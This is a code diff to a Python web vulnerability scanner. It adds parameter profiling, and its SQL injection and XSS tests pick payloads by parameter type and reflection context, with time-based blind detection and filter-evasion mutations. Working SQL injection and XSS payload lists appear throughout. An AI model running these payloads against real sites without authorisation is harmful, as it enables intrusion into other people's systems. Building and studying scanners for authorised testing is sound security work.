@@ -1046,6 +1046,111 @@ class VulnScanner:
 
         return list(endpoints)[:30]
 
+    # ── Parameter Profiler ─────────────────────────────────────────────────
+    def _profile_param(self, endpoint: dict, param_name: str) -> dict:
+        """Profile a parameter to understand its behavior before attacking.
+
+        Sends 3 probe requests to determine:
+        - type: int, string, empty-sensitive
+        - reflected: whether input appears in the response body
+        - reflection_context: where in the HTML it appears (tag, attribute, script, text)
+        - error_sensitive: whether unusual input triggers errors
+        - base_response_len: normal response length for comparison
+
+        This is what separates a smart scanner from a dumb fuzzer.
+        """
+        url = endpoint["url"]
+        profile = {
+            "name": param_name,
+            "type": "unknown",
+            "reflected": False,
+            "reflection_context": None,
+            "error_sensitive": False,
+            "base_response_len": 0,
+            "base_status": 0,
+        }
+
+        # Probe 1: send a normal-looking value
+        probe_val = "test123"
+        resp = self._send_test(endpoint, param_name, probe_val)
+        if not resp or not resp.text:
+            return profile
+
+        profile["base_response_len"] = len(resp.text)
+        profile["base_status"] = resp.status_code
+        base_text = resp.text
+
+        # Check reflection: does our probe value appear in the response?
+        if probe_val in resp.text:
+            profile["reflected"] = True
+            idx = resp.text.find(probe_val)
+            context_before = resp.text[max(0, idx - 80):idx].lower()
+
+            if "<script" in context_before and "</script>" not in context_before:
+                profile["reflection_context"] = "script"
+            elif re.search(r'(?:value|placeholder|title|alt|content)\s*=\s*["\'][^"\']*$', context_before):
+                profile["reflection_context"] = "attribute"
+            elif "<" in context_before and ">" not in context_before.split("<")[-1]:
+                profile["reflection_context"] = "tag"
+            else:
+                profile["reflection_context"] = "text"
+
+        # Probe 2: send a numeric value to detect type
+        resp2 = self._send_test(endpoint, param_name, "1")
+        if resp2:
+            resp3 = self._send_test(endpoint, param_name, "99999")
+            if resp3:
+                diff = self._response_diff(resp2.text, resp3.text)
+                if not diff["similar"]:
+                    profile["type"] = "int"
+                else:
+                    profile["type"] = "string"
+            if resp2.status_code != resp.status_code:
+                profile["type"] = "int"
+
+        # Probe 3: send a special character to see if error-sensitive
+        resp_err = self._send_test(endpoint, param_name, "';\"\\")
+        if resp_err:
+            if resp_err.status_code >= 500:
+                profile["error_sensitive"] = True
+            elif resp_err.status_code != profile["base_status"]:
+                profile["error_sensitive"] = True
+            elif resp_err.text:
+                # Check for error keywords not in baseline
+                error_kw = ["error", "exception", "warning", "fatal", "syntax",
+                            "invalid", "unexpected", "parse"]
+                err_count = sum(1 for kw in error_kw if kw in resp_err.text.lower()[:3000])
+                base_count = sum(1 for kw in error_kw if kw in base_text.lower()[:3000])
+                if err_count > base_count + 1:
+                    profile["error_sensitive"] = True
+
+        return profile
+
+    def _classify_response(self, resp: Optional[requests.Response],
+                           baseline_len: int = 0) -> str:
+        """Classify a response as normal, error, blocked, or redirect."""
+        if resp is None:
+            return "failed"
+        if resp.status_code in (403, 429, 503):
+            text_lower = resp.text[:1000].lower() if resp.text else ""
+            if any(kw in text_lower for kw in ("captcha", "challenge", "cloudflare",
+                                                "ddos", "rate limit", "blocked")):
+                return "waf"
+            return "blocked"
+        if resp.status_code in (301, 302, 303, 307, 308):
+            return "redirect"
+        if resp.status_code >= 500:
+            return "error"
+        if resp.status_code == 404:
+            return "not_found"
+        if resp.status_code == 200:
+            if baseline_len > 0 and resp.text:
+                ratio = len(resp.text) / max(baseline_len, 1)
+                if ratio < 0.3:
+                    return "truncated"
+            return "normal"
+        return "other"
+
     def crawl_for_endpoints(self, base_url: str, html: str, depth: int = 1) -> List[dict]:
         """Crawl the site to discover testable endpoints (URLs with params + forms).
 
@@ -1234,30 +1339,52 @@ class VulnScanner:
             pname = param_info["name"]
             pval = param_info.get("value", "") or "1"
 
-            # === Phase A: Error-based detection ===
+            # Profile the parameter first — understand before attacking
+            profile = self._profile_param(endpoint, pname)
             baseline_resp = self._send_test(endpoint, pname, pval)
             baseline_text = baseline_resp.text[:8000] if baseline_resp else ""
             baseline_len = len(baseline_resp.text) if baseline_resp else 0
 
-            base_payloads = [
-                f"{pval}'",
-                f"{pval}\"",
-                f"{pval}'--",
-                f"{pval}\\",
-                f"{pval}' OR ''='",
-                f"{pval}') OR ('1'='1",
-                f"{pval}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
-                f"{pval}' UNION SELECT NULL-- -",
-                f"{pval}' UNION SELECT NULL,NULL-- -",
-                f"{pval}' UNION SELECT NULL,NULL,NULL-- -",
-                f"{pval}; SELECT 1-- -",
-                f"{pval}' AND 1=CONVERT(int,@@version)-- -",
-            ]
+            # Skip params that look like CSRF tokens or static IDs
+            if pname.lower() in ("csrf", "token", "_token", "csrfmiddlewaretoken", "nonce"):
+                continue
 
-            # Generate WAF-evasion variants for key payloads
+            # Choose payloads based on profile
+            if profile["type"] == "int":
+                base_payloads = [
+                    f"{pval}-0",
+                    f"{pval} OR 1=1",
+                    f"{pval} AND 1=1",
+                    f"{pval} UNION SELECT NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL-- -",
+                    f"{pval} UNION SELECT NULL,NULL,NULL-- -",
+                    f"{pval} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+                    f"{pval} AND 1=CONVERT(int,@@version)-- -",
+                    f"{pval}; SELECT 1-- -",
+                    f"{pval}) OR (1=1",
+                ]
+            else:
+                base_payloads = [
+                    f"{pval}'",
+                    f"{pval}\"",
+                    f"{pval}'-- -",
+                    f"{pval}\\",
+                    f"{pval}' OR '1'='1",
+                    f"{pval}') OR ('1'='1",
+                    f"{pval}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+                    f"{pval}' UNION SELECT NULL-- -",
+                    f"{pval}' UNION SELECT NULL,NULL-- -",
+                    f"{pval}' UNION SELECT NULL,NULL,NULL-- -",
+                    f"{pval}; SELECT 1-- -",
+                    f"{pval}' AND 1=CONVERT(int,@@version)-- -",
+                ]
+
+            # If param is error-sensitive, prioritize error-based payloads
+            # If not, add more mutation variants to bypass filters
             error_payloads = list(base_payloads)
-            for bp in base_payloads[4:7]:
-                error_payloads.extend(self._mutate_sqli(bp))
+            if not profile["error_sensitive"]:
+                for bp in base_payloads[4:7]:
+                    error_payloads.extend(self._mutate_sqli(bp))
 
             for payload in error_payloads:
                 if shutdown_requested() or self._session.is_domain_blocked(domain):
@@ -1322,20 +1449,36 @@ class VulnScanner:
                         })
                         return findings
 
-            # === Phase C: Time-based blind detection ===
+            # === Phase C: Time-based blind detection (adaptive timing) ===
             if not findings and baseline_resp:
-                time_payloads = [
-                    (f"{pval}' AND SLEEP(5)-- -", "MySQL SLEEP"),
-                    (f"{pval}'; SELECT pg_sleep(5)-- -", "PostgreSQL pg_sleep"),
-                    (f"{pval}'; WAITFOR DELAY '0:0:5'-- -", "MSSQL WAITFOR"),
-                    (f"{pval}' AND BENCHMARK(5000000,SHA1('test'))-- -", "MySQL BENCHMARK"),
-                    (f"{pval}' OR SLEEP(5)-- -", "MySQL OR SLEEP"),
-                ]
+                # Build time payloads based on parameter type
+                if profile["type"] == "int":
+                    time_payloads = [
+                        (f"{pval} AND SLEEP(3)-- -", "MySQL SLEEP (int)"),
+                        (f"{pval} AND (SELECT SLEEP(3))-- -", "MySQL subquery SLEEP"),
+                        (f"{pval}; SELECT pg_sleep(3)-- -", "PostgreSQL pg_sleep"),
+                        (f"{pval}; WAITFOR DELAY '0:0:3'-- -", "MSSQL WAITFOR"),
+                        (f"{pval} AND BENCHMARK(3000000,SHA1('x'))-- -", "MySQL BENCHMARK"),
+                    ]
+                else:
+                    time_payloads = [
+                        (f"{pval}' AND SLEEP(3)-- -", "MySQL SLEEP (string)"),
+                        (f"{pval}' AND (SELECT SLEEP(3))-- -", "MySQL subquery SLEEP"),
+                        (f"{pval}'; SELECT pg_sleep(3)-- -", "PostgreSQL pg_sleep"),
+                        (f"{pval}'; WAITFOR DELAY '0:0:3'-- -", "MSSQL WAITFOR"),
+                        (f"{pval}' OR SLEEP(3)-- -", "MySQL OR SLEEP"),
+                    ]
 
-                # Measure baseline timing
-                t0 = time.time()
-                _ = self._send_test(endpoint, pname, pval)
-                baseline_time = time.time() - t0
+                # Adaptive baseline: take 2 samples to measure variance
+                times = []
+                for _ in range(2):
+                    t0 = time.time()
+                    _ = self._send_test(endpoint, pname, pval)
+                    times.append(time.time() - t0)
+                baseline_time = sum(times) / len(times)
+                baseline_variance = max(abs(t - baseline_time) for t in times)
+                # Threshold: baseline + max(2s, 2x variance)
+                threshold = baseline_time + max(2.0, baseline_variance * 3)
 
                 for payload, desc in time_payloads:
                     if shutdown_requested() or self._session.is_domain_blocked(domain):
@@ -1344,14 +1487,13 @@ class VulnScanner:
                     resp = self._send_test(endpoint, pname, payload)
                     elapsed = time.time() - t0
 
-                    # If response took 4+ seconds longer than baseline = delay was injected
-                    if elapsed > baseline_time + 4.0 and elapsed > 4.5:
-                        # Confirm with a second measurement to reduce false positives
+                    if elapsed > threshold and elapsed > baseline_time + 2.0:
+                        # Confirm with second measurement
                         t0 = time.time()
                         resp2 = self._send_test(endpoint, pname, payload)
                         elapsed2 = time.time() - t0
 
-                        if elapsed2 > baseline_time + 4.0 and elapsed2 > 4.5:
+                        if elapsed2 > threshold and elapsed2 > baseline_time + 2.0:
                             test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
                             findings.append({
                                 "severity": SEV_CRITICAL,
@@ -1396,22 +1538,61 @@ class VulnScanner:
             pname = param_info["name"]
             cid = secrets.token_hex(4)
 
-            payloads = [
-                # HTML context — unescaped tag injection
-                (f"<gs{cid}>", f"<gs{cid}>", "HTML tag injection"),
-                # Script injection
-                (f"<script>gs{cid}</script>", f"<script>gs{cid}</script>", "script injection"),
-                # Event handler (img onerror)
-                (f'<img src=x onerror="gs{cid}">', f"gs{cid}", "event handler injection"),
-                # SVG-based XSS (bypasses some filters)
-                (f'<svg onload="gs{cid}">', f"gs{cid}", "SVG onload injection"),
-                # Attribute breakout with event
-                (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute injection"),
-                # JavaScript protocol (href/action)
-                (f"javascript:gs{cid}//", f"javascript:gs{cid}", "javascript: URI"),
-                # Template injection (Angular/Vue/React)
-                (f"{{{{gs{cid}}}}}", f"gs{cid}", "template expression"),
-            ]
+            # Profile the parameter to understand reflection context
+            profile = self._profile_param(endpoint, pname)
+
+            if not profile["reflected"]:
+                # Input not reflected at all — XSS unlikely, skip quickly
+                # but try one probe to double-check
+                probe_resp = self._send_test(endpoint, pname, f"<gs{cid}>")
+                if not probe_resp or f"<gs{cid}>" not in (probe_resp.text or ""):
+                    continue
+
+            # Build context-specific payloads based on WHERE the reflection occurs
+            ctx = profile.get("reflection_context", "text")
+            all_payloads = []
+
+            if ctx == "attribute":
+                # Reflected inside an HTML attribute — break out first
+                all_payloads = [
+                    (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute breakout + event"),
+                    (f"' onfocus='gs{cid}' autofocus='", f"gs{cid}", "single-quote attr breakout"),
+                    (f'"><script>gs{cid}</script>', f"gs{cid}", "attribute breakout + script"),
+                    (f'" onmouseover="gs{cid}"', f"gs{cid}", "attribute + mouseover"),
+                ]
+            elif ctx == "script":
+                # Reflected inside a <script> block — close string/expression
+                all_payloads = [
+                    (f"';gs{cid};//", f"gs{cid}", "JS string breakout (single)"),
+                    (f'";gs{cid};//', f"gs{cid}", "JS string breakout (double)"),
+                    (f"</script><script>gs{cid}</script>", f"gs{cid}", "script tag breakout"),
+                    (f"-gs{cid}-", f"-gs{cid}-", "inline JS expression"),
+                ]
+            elif ctx == "tag":
+                # Reflected inside an HTML tag (between < and >)
+                all_payloads = [
+                    (f' onfocus="gs{cid}" autofocus ', f"gs{cid}", "in-tag event injection"),
+                    (f'><script>gs{cid}</script>', f"gs{cid}", "tag close + script"),
+                    (f' onmouseover="gs{cid}" ', f"gs{cid}", "in-tag mouseover"),
+                ]
+            else:
+                # Text context or unknown — full set
+                all_payloads = [
+                    (f"<gs{cid}>", f"<gs{cid}>", "HTML tag injection"),
+                    (f"<script>gs{cid}</script>", f"<script>gs{cid}</script>", "script injection"),
+                    (f'<img src=x onerror="gs{cid}">', f"gs{cid}", "event handler"),
+                    (f'<svg onload="gs{cid}">', f"gs{cid}", "SVG onload"),
+                    (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute injection"),
+                    (f"javascript:gs{cid}//", f"javascript:gs{cid}", "javascript: URI"),
+                ]
+
+            # Add mutation variants for the first few payloads
+            payloads = list(all_payloads)
+            for bp, _, _ in all_payloads[:2]:
+                for mut in self._mutate_xss(bp):
+                    if mut != bp:
+                        # Re-derive check string from mutation
+                        payloads.append((mut, f"gs{cid}", f"mutated: {mut[:20]}"))
 
             for payload, check_str, desc in payloads:
                 if shutdown_requested() or self._session.is_domain_blocked(domain):
@@ -1858,7 +2039,8 @@ class VulnScanner:
                     continue
                 tested += 1
                 path = urlparse(ep["url"]).path or "/"
-                params_str = ",".join(p["name"] for p in ep["params"][:3])
+                param_names = [p["name"] for p in ep["params"] if not p.get("hidden")][:3]
+                params_str = ",".join(param_names) if param_names else "(hidden only)"
                 print(f"        [{tested}] {ep['method']} {path} ({params_str})", end="", flush=True)
 
                 ep_findings = []
